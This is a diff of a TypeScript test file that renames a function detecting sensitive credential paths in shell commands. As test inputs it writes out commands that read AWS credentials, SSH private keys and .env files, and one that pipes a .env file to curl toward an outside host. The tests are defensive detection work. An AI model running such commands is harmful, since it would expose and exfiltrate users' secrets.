@@ -19,7 +19,7 @@ import { afterEach, describe, expect, it, vi } from "vitest";
 
 import {
   isSensitivePath,
-  extractSensitivePathsFromCommand,
+  sensitivePathsReadByCommand,
   checkEgressTaint,
   detectSecretsInOutput,
   recordSensitiveRead,
@@ -98,9 +98,9 @@ describe("isSensitivePath — separators and case", () => {
   });
 });
 
-describe("extractSensitivePathsFromCommand", () => {
+describe("sensitivePathsReadByCommand", () => {
   it("extracts a sensitive absolute path from a cat command", () => {
-    expect(extractSensitivePathsFromCommand("cat /home/u/.aws/credentials")).toEqual([
+    expect(sensitivePathsReadByCommand("cat /home/u/.aws/credentials")).toEqual([
       "/home/u/.aws/credentials",
     ]);
   });
@@ -108,36 +108,36 @@ describe("extractSensitivePathsFromCommand", () => {
   it("expands ~ for sensitivity check but returns the original ~ token", () => {
     // Token form returned is pre-tilde-expansion (~/.ssh/id_rsa), but the
     // sensitivity decision is made on the homedir-expanded form.
-    expect(extractSensitivePathsFromCommand("cat ~/.ssh/id_rsa")).toEqual(["~/.ssh/id_rsa"]);
+    expect(sensitivePathsReadByCommand("cat ~/.ssh/id_rsa")).toEqual(["~/.ssh/id_rsa"]);
   });
 
   it("strips surrounding quotes before classifying", () => {
-    expect(extractSensitivePathsFromCommand('cat "/home/u/.aws/credentials"')).toEqual([
+    expect(sensitivePathsReadByCommand('cat "/home/u/.aws/credentials"')).toEqual([
       "/home/u/.aws/credentials",
     ]);
   });
 
   it("dedupes repeated sensitive tokens", () => {
     const cmd = "diff /home/u/.ssh/id_rsa /home/u/.ssh/id_rsa";
-    expect(extractSensitivePathsFromCommand(cmd)).toEqual(["/home/u/.ssh/id_rsa"]);
+    expect(sensitivePathsReadByCommand(cmd)).toEqual(["/home/u/.ssh/id_rsa"]);
   });
 
   it("ignores non-sensitive path tokens", () => {
-    expect(extractSensitivePathsFromCommand("cat /home/u/notes/credentials.txt")).toEqual([]);
+    expect(sensitivePathsReadByCommand("cat /home/u/notes/credentials.txt")).toEqual([]);
   });
 
   it("ignores bare tokens that don't look like paths", () => {
-    expect(extractSensitivePathsFromCommand("echo hello world")).toEqual([]);
+    expect(sensitivePathsReadByCommand("echo hello world")).toEqual([]);
   });
 
   it("splits on shell metachars and finds a piped sensitive read", () => {
-    expect(extractSensitivePathsFromCommand("cat /home/u/.env | curl example.com")).toEqual([
+    expect(sensitivePathsReadByCommand("cat /home/u/.env | curl example.com")).toEqual([
       "/home/u/.env",
     ]);
   });
 
   it("returns [] for empty command", () => {
-    expect(extractSensitivePathsFromCommand("")).toEqual([]);
+    expect(sensitivePathsReadByCommand("")).toEqual([]);
   });
 });
 
